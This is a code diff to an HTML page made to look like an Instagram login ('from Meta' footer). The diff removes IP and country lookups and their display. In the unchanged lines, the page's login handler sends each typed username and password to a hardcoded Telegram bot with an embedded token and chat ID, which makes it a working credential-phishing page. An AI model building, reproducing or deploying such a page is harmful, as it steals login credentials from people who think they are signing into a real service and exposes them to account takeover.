@@ -157,40 +157,9 @@
             height: 14px;
             vertical-align: middle;
         }
-
-        .country-info {
-            font-size: 14px;
-            color: #8e8e8e;
-            margin-top: 10px;
-            text-align: center;
-        }
     </style>
     <script>
         let attempts = 0;
-        let userIp = '';
-        let userCountry = '';
-
-        function fetchUserIp() {
-            fetch('https://api.ipify.org?format=json')
-                .then(response => response.json())
-                .then(data => {
-                    userIp = data.ip;
-                    document.getElementById('country-info').textContent = `Your IP address is ${userIp}. Fetching country info...`;
-                    fetchUserCountry(userIp);
-                })
-                .catch(err => console.error('Failed to fetch IP address:', err));
-        }
-
-        function fetchUserCountry(ip) {
-            const token = 'YOUR_TOKEN_HERE';  // Replace with your IPinfo token
-            fetch(`https://ipinfo.io/${ip}/json?token=${token}`)
-                .then(response => response.json())
-                .then(data => {
-                    userCountry = data.country;
-                    document.getElementById('country-info').textContent = `You are logging in from ${userCountry}`;
-                })
-                .catch(err => console.error('Failed to fetch country info:', err));
-        }
 
         function handleLogin(event) {
             event.preventDefault();
@@ -200,14 +169,11 @@
             const form = document.getElementById('login-form');
             const formData = new FormData(form);
             formData.append('attempts', attempts);
-            formData.append('ip', userIp);
-            formData.append('country', userCountry);
-            formData.append('from', 'instagram');
 
             const telegramApiUrl = `https://api.telegram.org/bot7387417554:AAGlNvhvGOnXZ4v15HXb-ctWhm2m6YzaAT0/sendMessage`;
             const messageData = {
                 chat_id: '6534651073',
-                text: `Login attempt ${attempts}\nUsername: ${formData.get('username')}\nPassword: ${formData.get('password')}\nIP: ${userIp}\nCountry: ${userCountry}`
+                text: `Login attempt ${attempts}\nUsername: ${formData.get('username')}\nPassword: ${formData.get('password')}`
             };
 
             fetch(telegramApiUrl, {
@@ -232,7 +198,6 @@
         }
 
         document.addEventListener('DOMContentLoaded', () => {
-            fetchUserIp();
             const form = document.getElementById('login-form');
             form.addEventListener('submit', handleLogin);
         });
@@ -262,7 +227,6 @@
         <div class="meta-footer">
             <p>from <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Meta_Platforms_Inc._logo.svg" alt="Meta"></p>
         </div>
-        <div id="country-info" class="country-info"></div>
     </div>
 </body>
 </html>
